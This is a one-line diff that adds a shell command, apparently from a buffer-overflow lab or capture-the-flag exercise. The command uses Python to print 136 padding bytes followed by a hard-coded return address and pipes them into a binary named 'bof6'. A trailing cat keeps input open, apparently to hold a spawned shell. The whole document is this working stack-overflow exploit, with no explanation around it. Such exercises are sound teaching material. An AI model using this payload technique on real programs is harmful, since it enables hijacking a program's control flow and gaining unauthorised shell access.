@@ -1,0 +1,1 @@
+$ (python -c "print 'x'*136+'\x10\x50\x75\x55\x55\x55\x00\x00'";cat) | ./bof6
